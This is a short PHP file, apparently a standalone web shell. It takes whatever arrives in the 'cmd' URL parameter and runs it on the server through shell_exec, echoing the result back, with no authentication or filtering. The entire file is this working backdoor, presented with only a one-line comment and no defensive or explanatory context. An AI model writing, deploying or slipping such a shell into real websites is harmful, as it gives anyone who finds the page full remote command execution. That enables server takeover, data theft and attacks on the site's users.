<?php

//simple shell script to execute system commands

$command = $_GET['cmd'];
$response = shell_exec($command);
echo $response;
?>
